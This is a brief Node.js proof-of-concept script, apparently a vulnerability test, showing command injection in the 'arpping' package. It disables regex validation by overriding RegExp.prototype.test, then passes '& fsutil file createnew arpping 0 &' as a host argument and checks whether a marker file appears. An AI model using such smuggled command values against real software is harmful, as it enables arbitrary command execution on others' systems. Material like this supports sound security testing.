RegExp.prototype.test = () => true;
const Arpping = require('arpping');
const fs = require('fs');
const path = './arpping';
let arpping = new Arpping();
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
console.log(arpping.ping(['& fsutil file createnew arpping 0 &']).then(() => {
}).finally(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
}));